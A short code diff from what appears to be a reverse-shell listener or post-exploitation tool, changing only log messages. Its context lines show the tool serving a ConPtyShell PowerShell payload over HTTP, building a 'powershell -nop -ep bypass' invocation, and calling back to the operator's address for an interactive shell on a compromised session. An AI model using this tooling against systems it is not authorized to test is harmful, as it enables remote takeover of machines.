@@ -456,7 +456,7 @@ class Listener:
                 return
 
         http_port, http_thread = spawn_http_server(ps1_data, timeout=60.0)
-        notify('info', f"Serving ConPtyShell in-memory on port {_b(http_port)}")
+        notify('info', f"Serving ConPtyShell on port {_b(http_port)}")
 
         invoke_cmd = (
             f"powershell -nop -ep bypass -c \""
@@ -466,7 +466,7 @@ class Listener:
         )
 
         notify('info',
-            f"Invoking ConPtyShell (in-memory) on session {_p(f'#{sess.id}')} → callback {_b(self._mask_ip(local_ip, 'local'))}:{_b(self.port)}"
+            f"Invoking ConPtyShell on session {_p(f'#{sess.id}')} → callback {_b(self._mask_ip(local_ip, 'local'))}:{_b(self.port)}"
         )
 
         self._pending_conpty[sess.addr[0]] = sess.os_type
